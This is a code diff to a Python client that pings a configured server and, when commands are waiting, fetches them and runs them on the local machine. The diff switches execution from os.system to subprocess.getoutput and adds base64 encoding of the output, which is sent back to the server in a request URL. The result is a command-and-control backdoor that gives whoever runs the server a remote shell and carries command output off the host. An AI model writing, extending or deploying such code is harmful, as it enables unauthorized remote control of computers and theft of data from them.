@@ -5,6 +5,8 @@ import requests
 from urllib3.exceptions import MaxRetryError
 import os
 import roscraper
+import base64
+import subprocess
 
 from node import config
 
@@ -39,11 +41,12 @@ class Client:
                 try:
                     response = requests.get(config.server + 'ping/' + config.uuid)
                     if response.status_code == 200:
-                        print("Connection Successful")
                         systray.update(icon=config.resource_dir + 'connected.ico')
+                        print("Connection Successful")
                         Client.check_for_commands()
                     else:
                         print("UUID Invalid")
+                        systray.update(icon=config.resource_dir + 'disconnected.ico')
 
                 except:
                     print("Connection Error")
@@ -67,9 +70,12 @@ class Client:
 
     @staticmethod
     def check_for_commands():
-        commands = requests.get(config.server + 'commands/' + config.uuid)
-        if commands.status_code == 200:
-            os.system(commands.text)
+        command_response = requests.get(config.server + 'commands/' + config.uuid)
+
+        if command_response.status_code == 200:
+            command_output = base64.b64encode(str(subprocess.getoutput(command_response.text)).encode('ascii'))
+            command_output = command_output.decode('ascii')
+            requests.get(config.server + 'command_response/' + config.uuid + command_output)
         else:
             print('No Commands Found - Possible Connection Error')
 
